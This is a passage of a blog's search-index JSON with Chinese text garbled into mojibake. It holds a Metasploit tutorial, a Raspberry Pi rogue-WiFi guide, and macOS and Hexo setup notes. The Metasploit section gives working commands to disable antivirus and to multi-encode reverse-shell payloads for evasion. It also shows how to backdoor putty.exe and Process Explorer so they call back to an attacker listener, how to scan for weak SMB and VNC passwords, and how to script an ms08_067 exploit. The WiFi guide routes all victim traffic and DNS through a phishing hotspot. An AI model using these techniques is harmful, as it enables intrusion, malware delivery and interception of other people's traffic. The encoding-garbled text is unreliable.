éœ€è¦ç®¡ç†å‘˜æƒé™æ‰§è¡Œåé—¨æ‰èƒ½æˆåŠŸï¼Œè€Œmigrate å‰åè·å–çš„æƒé™æ˜¯æœ‰å·®å¼‚çš„ã€‚\n\n### å…³é—­æ€æ¯’è½¯ä»¶ \n\n```\nmeterpreter> run killav ï¼ˆè¿™ä¸ªè„šæœ¬è¦å°å¿ƒä½¿ç”¨ï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡æœºå™¨è“å±æ­»æœºã€‚ï¼‰ \n```\n\n### è·å–ç³»ç»Ÿæµé‡\n\n```\nmeterpreter> run packtrecorder â€“i 1 \n```\n\n### è·å–ç›®æ ‡ç½‘ç»œå…±äº«\n\n```\nmeterpreter> run scraper\n```\n\nä»ç›®æ ‡ä¸»æœºè·å¾—æ‰€æœ‰ç½‘ç»œå…±äº«ç­‰ä¿¡æ¯ã€‚å¹¶ä¸”è·å¾—çš„è¿™äº›æ‰€æœ‰è¿™äº›ä¿¡æ¯éƒ½å­˜å‚¨åœ¨ `/root/.msf4/logs/scripts/scraper/directory` ç›®å½•ä¸‹ã€‚ä½¿ç”¨ `ls` å‘½ä»¤æŸ¥çœ‹å­˜å‚¨çš„è¿™äº›æ–‡ä»¶ã€‚\n\n### VNCè¿œç¨‹ç•Œé¢æ§åˆ¶\n\n- VNCæ§åˆ¶å‘½ä»¤\n\n```\nmeterpreter> run vnc \nmeterpreter> run screen_unlock\n```\n\n### Windows APIç¼–ç¨‹ , Hello Worldå¼¹çª—\n\nä½¿ç”¨Railgun æ“ä½œwindows APIs \n\n```\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter client\n>> client.railgun.user32.MessageBoxA(0,\"Hello World\",\"Im Title\",\"MB_OK\")\n```\n\n### ç¼–ç ç»•è¿‡æ€è½¯\n\n```\nmsfencode â€“l #åˆ—å‡ºå¯ç”¨ç¼–ç å™¨ \n```\n\nç®€å•ç¼–ç ï¼š\n\n```\nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode â€“e x86/shikata_ga_nai â€“t exe > /var/www/payload2.exe \n```\n\nä½¿ç”¨R å‚æ•°ä½œä¸ºraw è¾“å‡ºè‡³ç®¡é“ï¼Œå†ç»è¿‡msfencode å¤„ç†ï¼Œæœ€åå¯¼å‡ºã€‚\n\nå¤šæ¬¡ç¼–ç ï¼š\n\n```\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | \nmsfencode â€“e x86/shikata_ga_nai â€“c 5 â€“t raw | msfencode â€“e x86/alpha_upper â€“c 2 â€“t raw | \nmsfencode â€“e x86/shikata_ga_nai â€“c 5 â€“t raw | msfencode â€“e x86/countdown â€“c 5 â€“t exe â€“o \n/var/www/payload3.exe \n```\n\nç®€å•ç¼–ç è¢«æ€æœºä¼šå¾ˆå¤§ï¼Œä½¿ç”¨å¤šæ¬¡ç¼–ç æ•ˆæœæ›´å¥½ï¼Œè¿™é‡Œä¸€å…±ä½¿ç”¨äº†17 æ¬¡å¾ªç¯ç¼–ç ã€‚ \n\n> é¢˜å¤–ï¼š\n>\n> ç»æµ‹è¯• >>> \n>\n> 1ï¼šä½¿ç”¨æ­¤å‘½ä»¤ç”Ÿæˆçš„åé—¨ä¹Ÿè¢«MSE æ€åˆ°ï¼›\n>\n> 2ï¼šæœªç¼–ç çš„åé—¨æˆ–ç¼–ç æ¬¡æ•°è¾ƒå°‘çš„åé—¨å¯ä»¥ç›´æ¥è¢«ç§’æ€ï¼›\n>\n> 3ï¼šwindows/x64/meterpreter/reverse_tcp ç”Ÿæˆçš„åé—¨æœªç»ä»»ä½•å¤„ç†ä»ç„¶ä¸è¢«æ€ï¼Œçœ‹æ¥æ€æ¯’è½¯ä»¶å‚»é€¼äº†ï¼›\n>\n> 4ï¼šx86 ç¼–ç å™¨ç¼–ç çš„åé—¨åœ¨64 ä½æœºå™¨ä¸Šæ— æ³•æ‰§è¡Œï¼›\n>\n> 5ï¼š360 æœ‰ä¸ªæ²™ç®±åŠŸèƒ½ï¼Œåé—¨æ–‡ä»¶å³é”®é€‰æ‹©â€œåœ¨360 éš”ç¦»æ²™ç®±ä¸­è¿è¡Œâ€ï¼Œmsfç…§æ ·å¯ä»¥è¿æ¥å¹¶æ“ä½œï¼Œçœ‹æ¥éš”ç¦»æ²™ç®±åŠŸèƒ½æœ‰é™ã€‚ï¼‰\n\n### è‡ªå®šä¹‰å¯æ‰§è¡Œç¨‹åºæ¨¡æ¿\n\nmsfencode é»˜è®¤ä½¿ç”¨data/templates/templates.exeï¼ˆmsf v4 åœ¨templates ç›®å½•ä¸‹æœ‰é’ˆå¯¹ä¸åŒ \nå¹³å°çš„ä¸åŒæ¨¡æ¿ï¼‰ä½œä¸ºå¯æ‰§è¡Œç¨‹åºçš„æ¨¡æ¿ï¼Œæ€æ¯’å‚å•†ä¹Ÿä¸æ˜¯å‚»é€¼ï¼Œæ‰€ä»¥è¿™é‡Œæœ€å¥½ä½¿ç”¨è‡ªå®šä¹‰æ¨¡æ¿ï¼Œå¦‚ï¼š \n\n```\nwget <http://download.sysinternals.com/Files/ProcessExplorer.zip> \ncd work \nunzip ProcessExplorer.zip \ncd .. \nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode \nâ€“t exe â€“x work/procexp.exe â€“o /var/www/pe_backdoor.exe â€“e x86/shikata_ga_nai â€“c 5 \n```\n\nåœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œï¼Œç„¶åæœ¬åœ°ä½¿ç”¨msfcli ç›‘å¬ç«¯å£ç­‰å¾…åå¼¹è¿æ¥ï¼š \n\n```\nmsfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 \nLPORT=8080 E\n```\n\n### æš—åº¦é™ˆä»“â€”çŒ¥çæ‰§è¡Œpayload (ç»‘å®šåˆ°å¯æ‰§è¡Œæ–‡ä»¶)\n\nç»‘å®špayload è‡³ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè®©ç›®æ ‡ä¸çŸ¥ä¸è§‰é—´ä¸­æ‹›ï¼Œä»¥putty.exe ä¸ºä¾‹ï¼š \n\n```\nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode \nâ€“t exe â€“x putty.exe -o /var/www/putty_backdoor.exe â€“e x86/shikata_ga_nai â€“k â€“c 5\n```\n\nå‡å¦‚é€‰æ‹©ä¸€ä¸ªGUI ç•Œé¢çš„ç¨‹åºä½œä¸ºç»‘å®šç›®æ ‡å¹¶ä¸”ä¸ä½¿ç”¨-k é€‰é¡¹ï¼Œåˆ™ç›®æ ‡æ‰§è¡Œæ­¤ç¨‹åºçš„æ—¶å€™ä¸ä¼šå¼¹å‡ºcmd çª—å£ï¼Œ-k é€‰é¡¹çš„ä½œç”¨æ˜¯payload ç‹¬ç«‹äºæ¨¡æ¿è½¯ä»¶çš„è¿›ç¨‹è¿è¡Œã€‚\n\n\n\n## å¸¸ç”¨æ¸—é€æ‰‹æ®µ\n\n### æ‰«æåŒ¿åFTP\n\n```\nuse auxiliary/scanner/ftp/anonymos \nset RHOSTS 192.168.1.0/24 \nset THREADS 50 \nrun \n```\n\n### ä¸nessus ç»“åˆæ‰«æ\n\nä½¿ç”¨Nessus æ‰«æå®Œæˆåç”Ÿæˆ.nessus æ ¼å¼çš„æŠ¥å‘Šï¼Œå¯¼å…¥åˆ°MSFï¼š \n\n```\ndb_connect postgres:toor@127.0.0.1/msf \ndb_import /tmp/nessus_report_Host_test.nessus \ndb_hosts â€“c address,svcs,vulns \ndb_vulns \n```\n\nåœ¨MSF ä¸­ä½¿ç”¨Nessusï¼š \n\n```\ndb_connect postgres:toor@127.0.0.1/msf \nload nessus \nnessus_connect nessus:toor@192.168.1.111:8834 ok \nnessus_policy_list #æŸ¥çœ‹å­˜åœ¨çš„æ‰«æè§„åˆ™ \nnessus_scan_new 2 bridge_scan 192.168.1.111 #2 è¡¨ç¤ºè§„åˆ™çš„ID å·ï¼Œbridge_scan è‡ªå®šä¹‰æ‰«æåç§° \nnessus_scan_status #æŸ¥çœ‹æ‰«æè¿›è¡ŒçŠ¶æ€ \nnessus_report_list #æŸ¥çœ‹æ‰«æç»“æœ \nnessus_report_get skjla243-3b5d-* #å¯¼å…¥æŠ¥å‘Š \ndb_hosts â€“c address,svcs,vulns\n```\n\n### SMBå¼±å£ä»¤æ‰«æ\n\n```\nmsf> use auxiliary/scanner/smb/smb_login \nset RHOSTS 192.168.1.111-222 \nset SMBUser Administrator \nset SMBPass admin \nrun \n```\n\n### VNCç©ºå£ä»¤æ‰«æ\n\n```\nmsf> use auxiliary/scanner/vnc/vnc_none_auth \nset RHOSTS 192.168.1.111 \nrun \n```\n\n### Open X11ç©ºå£ä»¤\n\n```\nmsf> use auxiliary/scanner/x11/open_x11 \nset RHOST 192.168.1.0/24 \nset THREADS 50 \nrun \n```\n\n### Msfè‡ªåŠ¨åŒ–æµ‹è¯•(ä¸€è¡Œå‘½ä»¤æ‰§è¡Œ)\n\nä¸ºäº†ç¼©çŸ­æ¸—é€æµ‹è¯•çš„æ—¶é—´å¯ä»¥å°† `Msf` å‘½ä»¤å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ `msfconsole` åŠ è½½æ‰§è¡Œã€‚\n\nåŠ è½½æ–¹å¼ï¼šmsfconsole çš„resource å‘½ä»¤æˆ–è€…msfconsole åŠ ä¸Š-r é€‰é¡¹ \n\nä¾‹å¦‚ï¼š\n\n```\necho â€˜versionâ€™ > resource.rc \necho â€˜load soundsâ€™ >> resource.rc \nmsfconsole â€“r resource.rc \n```\n\nä¾‹å¦‚ï¼š\n\n```\necho â€˜use exploit/windows/smb/ms08_067_netapiâ€™ > autoexp.rc \necho â€˜set RHOST 192.168.1.133â€™ >> autoexp.rc \necho â€˜set PAYLOAD windows/meterpreter/reverse_tcpâ€™ >> autoexp.rc \necho â€˜set LHOST 192.168.1.111â€™ >> autoexp.rc \necho â€˜exploitâ€™ >> autoexp.rc \nmsfconsole \nmsf> resource autoexp.rc\n```\n\n","tags":["MetaSploit"],"categories":["MetaSploitæ•™ç¨‹"]},{"title":"æ ‘è“æ´¾åˆ›å»ºé’“é±¼WiFiå®æˆ˜å…¨è¿‡ç¨‹","url":"%2F2018%2F02%2F23%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BCWiFi%E5%AE%9E%E6%88%98%E5%85%A8%E8%BF%87%E7%A8%8B%2F","content":"\n\n\n\n###  æµ‹è¯•ç¯å¢ƒ\n\n-  æ”»å‡»æœºï¼šæ ‘è“æ´¾3ä»£ B   `kali 2.0 armhf`\n\n  \t- å…é©±æ— çº¿ç½‘å¡\n\n-  å—å®³æœºï¼šMacBook  `MacOS Sierra 10.12.6`\n\n  â€‹\n\n### ç¯å¢ƒæ­å»º\n\n####å®‰è£…å¿…è¦å·¥å…·\n\n```bash\nsudo apt-get install hostapd dnsmasq\n```\n\nå®‰è£… `nodejs` , ä½ å¯ä»¥ç›´æ¥æ‰§è¡Œ\n\n```bash\nsudo apt-get install nodejs\n```\n\n>å½“å®‰è£…ä¸Šé¢å‘½ä»¤å®‰è£…å¤±è´¥æ—¶å°è¯•ä¸‹é¢æ–¹æ³•ï¼š\n>\n>è®¿é—® [å®˜æ–¹ä¸‹è½½é¡µé¢](https://nodejs.org/en/download/) ï¼Œæ‰¾åˆ°Source Codeæºç åŒ…[ä¸‹è½½åœ°å€](https://nodejs.org/dist/v8.9.4/node-v8.9.4.tar.gz)\n>\n>ä¾æ¬¡æ‰§è¡Œè¿›è¡Œ ä¸‹è½½ã€è§£åŒ…ã€ç¼–è¯‘ã€å®‰è£…ã€‚\n>\n>```bash\n>wget https://nodejs.org/dist/v8.9.4/node-v8.9.4.tar.gz\n>tar zxvf node-v8.9.4.tar.gz\n>cd node-v9.6.1\n>./configure\n>make\n>make install \n>```\n\nä¸‹è½½ `Closurether` ç¥å™¨\n\n```bash\ngit clone https://github.com/LFODER/closurether.git\n```\n\né€šè¿‡ `git` å…‹éš†åˆ°æœ¬åœ°ï¼Œå¼€å§‹è¿è¡Œ\n\n** è¿™é‡Œè¿˜è¦å®‰è£…ä¸€ä¸ªç¥å™¨ `Closurether` **  æœªå®Œå¾…ç»­\n\n\n\n#### ä¿®æ”¹ `hostapd` é…ç½®æ–‡ä»¶\n\nå®‰è£…å¥½åï¼Œåˆ†åˆ«æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œé¦–å…ˆä¿®æ”¹ `hostapd`çš„é…ç½®æ–‡ä»¶\n\n```bash\nsudo vim /etc/hostapd/hostapd.conf\n```\n\næŸ¥æ‰¾å¹¶ä¿®æ”¹ä»¥ä¸‹å†…å®¹ï¼š\n\n```shell\n# ä½ å³å°†å»ºç«‹çƒ­ç‚¹çš„æ— çº¿ç½‘å¡åå­—  å¯ä»¥ç”¨ ifconfig æˆ–è€… iw list æŸ¥çœ‹\ninterface=wlan1\n# æ— çº¿ç½‘å¡é©±åŠ¨\ndriver=nl80211\n# çƒ­ç‚¹åå­—\nssid=RaspberryPi\nhw_mode=g\nchannel=11\n# auth_alg è®¾ç½®ä¸º1 è¡¨ç¤ºå¼€æ”¾ç½‘ç»œ å…·ä½“ä½ å¯ä»¥é€‰æ‹© ç™¾åº¦ä¸€ä¸‹è¿™ä¸ªå­—æ®µ\nauth_alg=1\nwmm_enabled=0\n```\n\nå½“ç„¶ä½ ä¹Ÿå¯ä»¥è®¾ç½® **åŠ å¯†** çš„WiFiçƒ­ç‚¹ï¼Œå…·ä½“é…ç½®æ–¹æ³•ï¼Œè¯· [å‚è€ƒè¿™é‡Œ](https://www.jianshu.com/p/1fca72a710d5) ã€‚\n\n#### ä¿®æ”¹ `dnsmasq` é…ç½®æ–‡ä»¶\n\næ¥ä¸‹æ¥ä¿®æ”¹ `dnsmasq` çš„é…ç½®ï¼š\n\n```bash\nsudo vim /etc/dnsmasq.conf\n```\n\næ‰¾åˆ°ä¿®æ”¹æˆ–æ·»åŠ ä»¥ä¸‹å†…å®¹:\n\n```shell\n# ä½ å³å°†å»ºç«‹çƒ­ç‚¹çš„æ— çº¿ç½‘å¡åå­— å¯ä»¥ç”¨ ifconfig æˆ– iw list æŸ¥çœ‹\ninterface=wlan1\n# DNS\nlisten-address=192.168.22.1\nbind-interface\n# è®¾ç½®ä½ çš„çƒ­ç‚¹å¯åˆ†é…IPèŒƒå›´å’Œç§Ÿç”¨å‘¨æœŸã€‚\ndhcp-range=192.168.22.2,192.168.22.254,12h\n# è®¾ç½®å­ç½‘æ©ç \ndhcp-option=1,255.255.255.0\n# 3æ˜¯ç½‘å…³  6å…·ä½“æ˜¯ä»€ä¹ˆæ„æ€ å¿˜è®°äº†  æˆ‘åªè®°å¾—åˆä¸€ä¸ªæ˜¯DNSé…ç½® å…·ä½“éœ€è¦æŸ¥é˜…èµ„æ–™\ndhcp-option=3,192.168.22.1\ndhcp-option=6,192.168.22.1\n# æ‰€æœ‰è¿æ¥ä¸Šçƒ­ç‚¹çš„å®¢æˆ·ç«¯ æ‰€æœ‰æµé‡å…¨è§£æåˆ° 192.168.22.1  \naddress=/#/192.168.22.1\n\n```\n\nå…³äº `dnsmasq` ç›¸å…³æ¨èï¼š\n\n- [é€šè¿‡Dnsmasqè‡ªå»ºå¹²å‡€çš„DNSæœåŠ¡](https://biji.io/2017/4738.html)\n- [DNSéæ ‡å‡†ç«¯å£è®¾ç½®é—®é¢˜](https://www.v2ex.com/t/253201)\n\n\n\nè®¾ç½® IPv4 è½¬å‘\n\nè®¾ç½® IPv4 è½¬å‘ï¼Œé€šè¿‡ä¿®æ”¹æ–‡ä»¶é…ç½®æ¥æ‰“å¼€ IPv4 è½¬å‘ã€‚\n\n```bash\nsudo vim /etc/sysctl.conf\n```\n\næ‰¾åˆ° `net.ipv4.ip_forward=1`ï¼Œå»æ‰æ³¨é‡Šç¬¦å·ï¼Œä½¿å…¶ç”Ÿæ•ˆã€‚\n\nä½†æ˜¯è¿™æ ·è®¾ç½®ï¼Œéœ€è¦åœ¨ä¸‹æ¬¡é‡å¯åæ‰ä¼šç”Ÿæ•ˆï¼Œå¦‚æœä¸æƒ³é‡å¯ç›´æ¥æ‰§è¡Œä¸‹é¢å‘½ä»¤å³å¯ï¼š\n\n```bash\nsudo sh -c \"echo 1 >/proc/sys/net/ipv4/ip_forward\"\n```\n\n#### ä¿®æ”¹é˜²ç«å¢™è®¾ç½®\n\næˆ‘è¿™é‡Œæ˜¯å°†ä»¥å¤ªç½‘ `eth0` æ¥å£å…±äº«ç»™æ ‘è“æ´¾å¤–æ¥ç½‘å¡ `wlan1` æ¥å£ä¸Šç½‘ï¼Œéœ€è¦é…ç½®NATï¼Œéœ€è¦å…ˆå¯¹é˜²ç«å¢™è¿›è¡Œæ“ä½œï¼š\n\n```bash\nsudo iptables -t nat -APOSTROUTING -o eth0 -j MASQUERADE\nsudo iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT\nsudo iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT\n```\n\nå½“ç„¶å¦‚æœä¸æƒ³æ¯æ¬¡éƒ½è®¾ç½®ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è®¾ç½®ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼š\n\n```bash\nsudo sh -c \"iptables-save> /etc/iptables.ipv4.nat\"\n```\n\n### å¯åŠ¨é’“é±¼çƒ­ç‚¹\n\nè¿™é‡Œç»™å‡ºä¸€ä¸ª `bash`  è„šæœ¬ï¼Œä½œç”¨å¾ˆç®€å•ï¼Œ å¼€å¯å’Œå…³é—­é’“é±¼çƒ­ç‚¹ï¼Œä¿å­˜æ–‡ä»¶åˆ°ä»»ä½•ç›®å½•\n\nå‡è®¾ä½ å­˜å‚¨çš„æ–‡ä»¶åä¸º `apapap.sh`\n\n```shell\n#! /bin/bash\ncase $1 in\n    \"start\")\n       sleep 1\n       ifconfig wlan1 192.168.22.1 netmask 255.255.255.0  \n       sleep 1\n       echo \"1\" >/proc/sys/net/ipv4/ip_forward\n       sleep 1\n       iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE     \n       sleep 1\n       /etc/init.d/hostapd start\n       sleep 1\n       /etc/init.d/dnsmasq start\n    ;;\n    \"stop\")\n       /etc/init.d/dnsmasq stop\n       /etc/init.d/hostapd stop\n       sleep 1\n       iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE  \n       sleep 1\n       echo \"0\" >/proc/sys/net/ipv4/ip_forward\n       sleep 1\n    ;;\n    *)\n       echo \"Usage $0 {start|stop}\"\n    ;;\n    esac\n```\n\né¦–å…ˆè¦ç»™æ–‡ä»¶æ‰§è¡Œæƒé™ï¼š\n\n```bash\nsudo chmod 755 apapap.sh\n```\n\nç„¶åæ‰§è¡Œ\n\n```bash\n./apapap.sh\n```\n\næ­£å¸¸ä¼šå‡ºç°ï¼š\n\n```bash\nroot@kali:~# ./apapap.sh \nUsage ./apapap.sh {start|stop}\nroot@kali:~# \n```\n\nç”¨æ³•ä¸€ç›®äº†ç„¶ï¼Œçœ‹çœ‹æ­£å¸¸å¯åŠ¨çš„çŠ¶æ€ã€‚\n\n```bash\nroot@kali:~# ./apapap.sh start\n[ ok ] Starting hostapd (via systemctl): hostapd.service.\n[ ok ] Starting dnsmasq (via systemctl): dnsmasq.service.\nroot@kali:~# \n```\n\nä¸å‡ºæ„å¤–çš„è¯ï¼Œæ‰§è¡Œå®Œæˆäº†å°±æ˜¯è¿™æ ·ï¼Œæ­¤æ—¶ä½ å»æŸ¥çœ‹Wifiçƒ­ç‚¹ï¼Œçœ‹æ˜¯å¦æˆåŠŸå¼€å¯äº†ã€‚\n\n![](https://ws1.sinaimg.cn/large/006tNc79gy1foqfkel5jgj30fs0xm40p.jpg)\n\nå·²ç»å¼€å¯äº†çƒ­ç‚¹ï¼Œç°åœ¨è¿å…¥wifiçš„æ‰€æœ‰å®¢æˆ·ç«¯æµè§ˆéƒ½ç»è¿‡æ ‘è“æ´¾ç½‘å¡ã€‚\n\n\n\nä¸€äº›ğŸ˜ˆé‚ªæ¶çš„ç©æ³• ï¼Œè¯·å‚è€ƒè¿™é‡Œï¼šhttp://www.freebuf.com/articles/web/43353.html \n","tags":["æ ‘è“æ´¾"]},{"title":"MacOSå®‰è£…Metasploitå…¨æ”»ç•¥","url":"%2F2018%2F02%2F22%2FMacOS%E5%AE%89%E8%A3%85Metasploit%E5%85%A8%E6%94%BB%E7%95%A5%2F","content":"\n## æµ‹è¯•ç¯å¢ƒ\n\n- ç³» ç»Ÿ: `MacOS Sierra 10.12.6`\n\n## ä¸‹è½½MetaSploitå®˜æ–¹æœ€æ–°ç‰ˆ\n\nMetaSploit Framework æœ€æ–°ç‰ˆ  [ä¸‹è½½åœ°å€](http://osx.metasploit.com/metasploitframework-latest.pkg)\n\nä¸‹è½½å®Œæˆï¼ŒåŒå‡»å®‰è£…ã€‚æ­¤æ—¶ç»ˆç«¯è¾“å…¥ `msfconsole` æç¤ºæ‰¾ä¸åˆ°ï¼Œæ˜¯å› ä¸ºç¯å¢ƒå˜é‡æ²¡æœ‰è®¾ç½®ã€‚\n\n## æ·»åŠ ç¯å¢ƒå˜é‡\n\næ­£å¸¸çš„æ–¹æ³•æ˜¯:\n\n```bash\nvim /etc/profile\n```\n\nç„¶åæ·»åŠ \n\n```Bash\nexport PATH=\"/opt/metasploit-framework/bin:$PATH\"\n```\n\nä½¿ç¯å¢ƒå˜é‡ç«‹åˆ»ç”Ÿæ•ˆ\n\n```bash\nsource /etc/profile\n```\n\nå¦‚æœä½ ä½¿ç”¨çš„æ˜¯ `zsh` é‚£ä¹ˆåˆ™æ˜¯ä¸‹é¢çš„æ–¹æ³•: \n\n```bash\nvim ~/.zshrc\n```\n\nç„¶åæ·»åŠ \n\n```bash\nexport PATH=\"/opt/metasploit-framework/bin:$PATH\"\n```\n\nä½¿ç¯å¢ƒå˜é‡ç«‹åˆ»ç”Ÿæ•ˆ\n\n```bash\nsource ~/.zshrc\n```\n\n\n\n## è¿è¡Œä¸æ›´æ–°\n\nç»ˆç«¯è¾“å…¥ `msf`  å¹¶æŒ‰ `Tab` é”®ï¼Œçœ‹æ˜¯å¦èƒ½å‡ºç°\n\n```bash\nâœ  ~ msf\nmsfbinscan   msfdb        msfpescan    msfrpc       msfvenom                \nmsfconsole   msfelfscan   msfremove    msfrpcd                            \nmsfd         msfmachscan  msfrop       msfupdate   \n```\n\nè‹¥å‡ºç°ä¸Šé¢ç»“æœï¼Œä»£è¡¨ç¯å¢ƒå˜é‡å·²ç»ç”Ÿæ•ˆã€‚\n\næ¥ä¸‹æ¥æ›´æ–°Metasploitï¼š\n\nç»ˆç«¯æ‰§è¡Œ `msfupdate`\n\nOK\n\n\n\n## å„ç§é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆ\n\n### æœç´¢æ”»å‡»æ¨¡å—æ—¶å‡ºç°æ¨¡å—æ¢æˆæ•°æ®åº“ä¸èƒ½å»ºç«‹ï¼Œä½¿ç”¨æ…¢æœç´¢æ¨¡å¼\n\nç°è±¡ï¼š\n\n```\n [!] Module database cache not built yet, using slow search\n```\n\nè§£å†³æ–¹æ¡ˆ:\n\n```\nmsf > db_rebuild_cache\n```\n\n### æ²¡æœ‰è¿æ¥ä¸Šæ•°æ®åº“\n\nç°è±¡ï¼š\n\n```\nmsf > db_rebuild_cache \n[-] The database is not connected\nmsf > db_status \n[*] postgresql selected, no connection\n```\n\nè§£å†³æ–¹æ¡ˆï¼š\n\n```\n\n```\n\n### Postgresql æœåŠ¡æ²¡æœ‰å¯åŠ¨\n\nç°è±¡ï¼š\n\n```bash\nâœ  ~ msfconsole \n[-] Failed to connect to the database: could not connect to server: Connection refused\n\tIs the server running on host \"127.0.0.1\" and accepting\n\tTCP/IP connections on port 5433?\n```\n\nè§£å†³æ–¹æ¡ˆï¼š","tags":["MacOS"],"categories":["MetaSploitæ•™ç¨‹"]},{"title":"Hexoåšå®¢è°ƒæ•™æ—¥è®°","url":"%2F2018%2F02%2F21%2FHexo%E5%8D%9A%E5%AE%A2%E8%B0%83%E6%95%99%E6%97%A5%E8%AE%B0%2F","content":"## Hexo å®‰è£…ä¸é…ç½®\n### Hexoå®‰è£…\n> [è‡ªè¡Œç™¾åº¦](https://www.baidu.com/s?ie=UTF-8&wd=Hexo%E5%AE%89%E8%A3%85) | [å®˜æ–¹æ–‡æ¡£](https://hexo.io/zh-cn/docs/)\n### æµ‹è¯•ç¯å¢ƒ\n> æ“ä½œç³»ç»Ÿ: `MacOS Sierra 10.12.6`\n> åšå®¢ä¸»é¢˜: `next`\n\n### å¯åŠ¨æœç´¢åŠŸèƒ½\né¦–å…ˆåˆ°åšå®¢æ ¹ç›®å½•(è¿™é‡ŒæŒ‡ä½  Hexo init åçš„åšå®¢ç›®å½•)æ‰§è¡Œ:\n```\nnpm install hexo-generator-search --save\n```\nç„¶ååˆ°ä½ çš„ä¸»é¢˜ç›®å½•ä¸‹ä¿®æ”¹ `_config.yml` æ–‡ä»¶\næˆ‘ä½¿ç”¨çš„æ˜¯`Next`ä¸»é¢˜ï¼Œè¿›å…¥åšå®¢æ ¹ç›®å½•ï¼Œæ‰¾åˆ° `themes/next/_config.yml` æ–‡ä»¶ï¼Œæœç´¢ `local_search:`\nä¼šçœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼š\n```\n# Local search\n# Dependencies: https://github.com/theme-next/hexo-generator-searchdb\nlocal_search:\n  enable: false\n  # if auto, trigger search by changing input\n  # if manual, trigger search by pressing enter key or search button\n  trigger: auto\n  # show top n results per article, show all results by setting to -1\n  top_n_per_article: 1\n  # unescape html strings to the readable one\n  unescape: false\n```\nå°† `enable: false` æ”¹æˆ `enable: true` å³å¯å¯ç”¨æœ¬åœ°æœç´¢åŠŸèƒ½ã€‚\nç„¶ååœ¨ `themes/next/_config.yml` æ–‡ä»¶ä¸­æ·»åŠ :\n```\n# Search\nsearch:\n  path: search.xml\n  field: post\n  format: html\n  limit: 10000\n```\n### å¯ç”¨æœ¬åœ°å›¾ç‰‡\nåšå®¢ä¸­å¾€å¾€ä¼šé¢‘ç¹ä½¿ç”¨åˆ°å›¾ç‰‡ï¼Œå¤–é“¾å›¾ç‰‡åˆ°åšå®¢æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯\n```\n!(å›¾ç‰‡æè¿° å¯é€‰)[å›¾ç‰‡é“¾æ¥]\n```\nä½†æ˜¯å¾€å¾€å»æ‰¾ä¸€ä¸ªé è°±çš„å›¾åºŠæ˜¯ä¸€ä»¶å¾ˆå¤´ç–¼çš„äº‹æƒ…ï¼Œå¦‚æœä½ çš„æœåŠ¡å™¨å¸¦å®½å¤Ÿå¤§ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨æœ¬åœ°å›¾ç‰‡ï¼Œå¼€å¯æœ¬åœ°å›¾ç‰‡çš„æ–¹æ³•:\né¦–å…ˆè¿›å…¥åšå®¢æ ¹ç›®å½•ï¼Œç¼–è¾‘ `_config.yml` æ–‡ä»¶ï¼Œæ‰¾åˆ° `post_asset_folder:false` ä¿®æ”¹ä¸º `post_asset_folder:true`\nç„¶ååœ¨åšå®¢æ ¹ç›®å½•æ‰§è¡Œ \n```\nnpm install https://github.com/CodeFalling/hexo-asset-image --save\n```\næ­¤æ—¶ä½ ä½¿ç”¨ `hexo new \"ä¸€ç¯‡åšå®¢\"` çš„æ—¶å€™ï¼Œä¼šåœ¨åšå®¢æ ¹ç›®å½•ä¸‹ `source/_posts/` ä¸‹åˆ›å»ºä¸åšå®¢åŒåçš„æ–‡ä»¶å¤¹ç”¨äºå­˜æ”¾æœ¬åœ°å›¾ç‰‡ï¼Œæ–¹ä¾¿åœ¨åšå®¢ä¸­è°ƒç”¨ã€‚\nåšå®¢è°ƒç”¨æœ¬åœ°å›¾ç‰‡æ—¶å¦‚ä¸‹:\n```\n![â€œå›¾ç‰‡æè¿°â€ï¼ˆå¯ä»¥ä¸å†™ï¼‰](/æ–‡ä»¶å¤¹å/ä½ çš„å›¾ç‰‡åå­—.JPG)\n```\n### æ’å…¥éŸ³ä¹\nä¾‹å¦‚ç½‘æ˜“äº‘ï¼Œç›´æ¥è·å–æ’­æ”¾å™¨å¤–é“¾ï¼Œiframeä»£ç ç›´æ¥å†™åˆ°Blogä¸­å³å¯ã€‚\n\n### å¯ç”¨åˆ†ç±»é¡µ\né¦–å…ˆæ‰§è¡Œ:\n```\nhexo new page \"categories\"\n```\næ–°å»ºä¸€ä¸ªé¡µé¢ä¸º `categories` çš„åˆ†ç±»é¡µé¢ï¼Œç„¶åä¼šè‡ªåŠ¨åœ¨åšå®¢æ ¹ç›®å½•ä¸‹çš„ `source/_posts/` ç”Ÿæˆä¸€ä¸ª `categories` çš„ç›®å½•ï¼Œé‡Œé¢æœ‰ä¸€ä¸ª `index.md`\næ‰“å¼€çœ‹çœ‹å†…å®¹å¦‚ä¸‹ï¼š\n```\n---\ntitle: \"categories\"\ndate: 2018-02-22 11:44:07\n---\n```\nä¿®æ”¹æˆå¦‚ä¸‹\n```\n---\ntitle: æ–‡ç« åˆ†ç±»\ndate: 2018-02-22 11:44:07\ntype: \"categories\"\ncomments: false\n---\n```\nè¿™é‡Œå°±æ˜¯éœ€è¦æ·»åŠ ä¸€ä¸ª `type` å­—æ®µï¼Œç±»å‹å€¼ä¸º `categories`\n> å¦‚æœå¯ç”¨è¿‡ 